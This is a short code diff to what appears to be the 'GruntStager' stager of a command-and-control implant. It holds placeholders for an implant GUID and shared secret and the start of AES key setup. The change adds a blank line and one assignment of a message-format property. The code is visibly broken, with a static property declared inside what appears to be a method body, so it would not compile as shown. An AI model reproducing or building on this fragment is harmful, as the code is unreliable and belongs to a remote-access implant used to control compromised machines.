@@ -45,6 +45,7 @@ namespace GruntStager
                 string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                 byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
+                
                 public static string GetMessageFormat
                 {
                     get
@@ -58,6 +59,8 @@ namespace GruntStager
                         return sb.ToString();
                     }
                 }
+
+                string MessageFormat = GetMessageFormat;
 
 
                 Aes SetupAESKey = Aes.Create();
